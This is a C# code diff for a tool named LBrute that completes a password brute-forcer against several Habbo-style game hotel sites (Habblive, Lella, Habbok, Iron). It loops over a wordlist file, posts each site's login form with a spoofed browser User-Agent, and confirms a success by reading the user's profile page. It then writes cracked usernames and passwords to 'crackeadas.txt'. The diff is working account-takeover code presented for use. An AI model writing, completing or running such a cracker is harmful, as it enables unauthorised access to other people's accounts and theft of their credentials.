@@ -39,28 +39,69 @@ namespace LBrute
             }
         }
 
-        private static async void Checker(Dictionary<string, string> form) 
+        private static async void Checker(string username, string password, Dictionary<string, string> form) 
         {
             using (HttpClient client = new HttpClient()) 
             {
-
+                client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Maxthon)");
+                var formurlencodedcontent = new FormUrlEncodedContent(form);
+                await client.PostAsync(LoginUrl, formurlencodedcontent);
+                string body = await client.GetStringAsync(MeUrl);
+                if (body.Contains(username))
+                {
+                    crackeadas++;
+                    File.AppendAllText("crackeadas.txt", $"[{hotel}] - Usuário: {username} - Senha: {password}");
+                }
+                else 
+                    invalidas++;
+                
+                Menu.UpdateTitle();
             }
         }
 
-        private static async void Habblive(string username, string password) 
+        private static void Habblive(string username, string password) 
         {
-            
+            var formulario = new Dictionary<string, string>{
+                ["username"] = username,
+                ["password"] = password
+            };
+            Checker(username, password, formulario);
         }
 
-        private static async void Lella(string username, string password) { }
-        private static async void Habbok(string username, string password) { }
-        private static async void Iron(string username, string password) { }
+        private static void Lella(string username, string password) 
+        {
+            var formulario = new Dictionary<string, string> { 
+                ["type"] = "normal",
+                ["username"] = username,
+                ["password"] = password
+            };
+            Checker(username, password, formulario);
+        }
+
+        private static void Habbok(string username, string password) 
+        {
+            var formulario = new Dictionary<string, string> { 
+                ["habbinc-login-username"] = username,
+                ["habbinc-login-senha"] = password
+            };
+            Checker(username, password, formulario);
+        }
+
+        private static void Iron(string username, string password) 
+        {
+            var formulario = new Dictionary<string, string> {
+                ["username"] = username,
+                ["password"] = password,
+                ["token"] = ""
+            };
+            Checker(username, password, formulario);
+        }
 
 
         private static void InitBrute(string username){
             foreach (var password in File.ReadAllLines("senhas.txt")) {
-                
 
+                Habblive(username, password);
 
             }
         }
